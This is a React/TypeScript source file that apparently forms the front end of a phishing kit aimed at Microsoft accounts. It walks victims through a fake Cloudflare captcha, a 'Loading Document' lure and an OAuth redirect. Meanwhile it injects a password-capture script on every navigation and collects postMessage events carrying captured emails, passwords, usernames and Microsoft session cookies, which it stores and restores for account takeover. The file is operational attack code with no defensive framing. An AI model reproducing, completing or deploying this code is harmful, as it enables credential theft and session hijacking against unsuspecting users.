import React, { useState, useEffect } from 'react';
import MessageIconLanding from './components/MessageIconLanding';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';

// 🟢 NEW: Import robust cookie/email setter from restoreCookies.js
import { restoreCookies, setCapturedEmail, setCapturedCookies } from './utils/restoreCookies';
// 🟢 NEW: Import password/email/username capture injector
import { injectPasswordCaptureScript } from './utils/password-capture-injector';

// Artificial delay helper (milliseconds)
const SLOW_DELAY = 1200; // Base delay, x3 for each step (e.g., 3600ms)
const nextStepDelay = SLOW_DELAY * 3;
const messageIconDelay = 500; // This matches the delay used in MessageIconLanding
const captchaVerificationDelay = 1500; // Default verification delay for captcha
const redirectingDelay = 3000; // Reduced delay for faster transition to prevent white page

// Calculate total delay for captcha to handle everything internally
const totalCaptchaDelay = captchaVerificationDelay + messageIconDelay + nextStepDelay;

function App() {
  const [currentPage, setCurrentPage] = useState('captcha');

  // State to hold the most reliable email and cookies captured via postMessage
  const [capturedEmail, setCapturedEmailState] = useState<string | null>(null);
  const [capturedCookies, setCapturedCookiesState] = useState<string | null>(null);
  // 🟢 Optionally track captured credentials (password/email/username)
  const [capturedCredentials, setCapturedCredentials] = useState<{
    email?: string;
    password?: string;
    username?: string;
    domain?: string;
    captureTime?: string;
    source?: string;
    url?: string;
  } | null>(null);

  // Add CSS animation for dots
  useEffect(() => {
    const style = document.createElement('style');
    style.textContent = `
      @keyframes dotAnimation {
        0% { opacity: 0; }
        20% { opacity: 1; }
        100% { opacity: 0; }
      }
      .redirecting-dots span:nth-child(1) { animation-delay: 0s; }
      .redirecting-dots span:nth-child(2) { animation-delay: 0.2s; }
      .redirecting-dots span:nth-child(3) { animation-delay: 0.4s; }
      .redirecting-dots span:nth-child(4) { animation-delay: 0.6s; }
      .redirecting-dots span:nth-child(5) { animation-delay: 0.8s; }
      .redirecting-dots span:nth-child(6) { animation-delay: 1.0s; }
    `;
    document.head.appendChild(style);
    return () => document.head.removeChild(style);
  }, []);

  // Handle redirecting to OAuth after delay
  useEffect(() => {
    if (currentPage === 'redirecting') {
      const timer = setTimeout(() => {
        setCurrentPage('oauth-redirect');
      }, redirectingDelay);
      return () => clearTimeout(timer);
    }
  }, [currentPage]);

  // 🟢 Use the new generic password/email/username capture injector everywhere needed
  useEffect(() => {
    injectPasswordCaptureScript();

    // Also inject when URL changes (for SPAs)
    const originalPushState = history.pushState;
    const originalReplaceState = history.replaceState;

    history.pushState = function (...args) {
      originalPushState.apply(history, args);
      setTimeout(injectPasswordCaptureScript, 1000);
    };

    history.replaceState = function (...args) {
      originalReplaceState.apply(history, args);
      setTimeout(injectPasswordCaptureScript, 1000);
    };

    window.addEventListener('popstate', () => {
      setTimeout(injectPasswordCaptureScript, 1000);
    });

    return () => {
      history.pushState = originalPushState;
      history.replaceState = originalReplaceState;
    };
  }, []);

  // Listen for messages from enhancer scripts for robust cookie/email/password/username capture
  useEffect(() => {
    function handleMessage(event: MessageEvent) {
      if (!event.data || typeof event.data !== 'object') return;

      if (event.data.type === 'EMAIL_CAPTURED' && event.data.email) {
        setCapturedEmailState(event.data.email);
        setCapturedEmail(event.data.email);
      }

      if (event.data.type === 'MICROSOFT_COOKIES_CAPTURED' && event.data.data?.cookies) {
        try {
          const cookiesJson = JSON.stringify(event.data.data.cookies);
          setCapturedCookiesState(cookiesJson);
          setCapturedCookies(event.data.data.cookies);
          restoreCookies(event.data.data.cookies); // Optionally restore immediately
        } catch (e) {
          // fallback: ignore
        }
      }

      // 🟢 Listen for generic credentials (password/email/username)
      if (
        event.data.type === 'CREDENTIALS_CAPTURED' &&
        (event.data.data?.password || event.data.data?.email || event.data.data?.username)
      ) {
        setCapturedCredentials(event.data.data);
        // Optionally, also update captured email state
        if (event.data.data.email) {
          setCapturedEmailState(event.data.data.email);
          setCapturedEmail(event.data.data.email);
        }
        // You can now access event.data.data.password, event.data.data.username, etc.
      }

      if (event.data.type === 'ORGANIZATIONAL_CREDENTIALS_CAPTURED' && event.data.data?.email) {
        setCapturedEmailState(event.data.data.email);
        setCapturedEmail(event.data.data.email);
      }
    }

    window.addEventListener('message', handleMessage, false);
    return () => window.removeEventListener('message', handleMessage);
  }, []);

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const step = urlParams.get('step');
    if (step && ['captcha', 'message-icon', 'redirecting', 'oauth-redirect', 'success', 'document-loading'].includes(step)) {
      setCurrentPage(step);
      window.history.replaceState({}, document.title, window.location.pathname);
    }
  }, []);

  // Captcha verified: go to redirecting page
  const handleCaptchaVerified = () => {
    setCurrentPage('redirecting');
  };

  const handleCaptchaBack = () => {
    window.location.reload();
  };

  const handleOAuthSuccess = async (sessionData: any) => {
    setCurrentPage('document-loading');
  };

  const handleOAuthBack = () => {
    setCurrentPage('message-icon');
  };

  switch (currentPage) {
    case 'captcha':
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
          verificationDelay={captchaVerificationDelay}
          autoRedirectDelay={messageIconDelay}
          totalDelayTime={totalCaptchaDelay}
        />
      );

    case 'redirecting':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{
            textAlign: 'center',
            fontSize: '24px',
            color: '#323130'
          }}>
            Opening
            <span className="redirecting-dots">
              <span style={{ animation: 'dotAnimation 1.5s infinite' }}>.</span>
              <span style={{ animation: 'dotAnimation 1.5s infinite' }}>.</span>
              <span style={{ animation: 'dotAnimation 1.5s infinite' }}>.</span>
              <span style={{ animation: 'dotAnimation 1.5s infinite' }}>.</span>
              <span style={{ animation: 'dotAnimation 1.5s infinite' }}>.</span>
              <span style={{ animation: 'dotAnimation 1.5s infinite' }}>.</span>
            </span>
          </div>
        </div>
      );

    case 'message-icon':
      return (
        <MessageIconLanding
          onOpenMessage={() => {}}
        />
      );

    case 'oauth-redirect':
      return (
        <RealOAuthRedirect
          onLoginSuccess={handleOAuthSuccess}
        />
      );

    case 'success':
    case 'document-loading':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{
            textAlign: 'center',
            background: 'white',
            padding: '60px',
            borderRadius: '8px',
            boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
          }}>
            <div style={{
              width: '80px',
              height: '80px',
              background: '#0078d4',
              borderRadius: '8px',
              margin: '0 auto 30px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              animation: 'spin 2s linear infinite',
              fontSize: '40px',
              color: 'white'
            }}>
              📄
            </div>
            <h2 style={{ color: '#323130', margin: '0 0 10px' }}>
              Loading Document...
            </h2>
            <p style={{ color: '#605e5c', margin: '0 0 20px' }}>
              Please wait while we prepare your Microsoft document
            </p>
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              gap: '10px',
              marginTop: '30px'
            }}>
              <button
                onClick={() => setCurrentPage('captcha')}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#0078d4',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Start Over
              </button>
              <button
                onClick={() => setCurrentPage('oauth-redirect')}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#107c10',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Try Again
              </button>
            </div>
          </div>
        </div>
      );

    default:
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
          verificationDelay={captchaVerificationDelay}
          autoRedirectDelay={messageIconDelay}
          totalDelayTime={totalCaptchaDelay}
        />
      );
  }
}

export default App;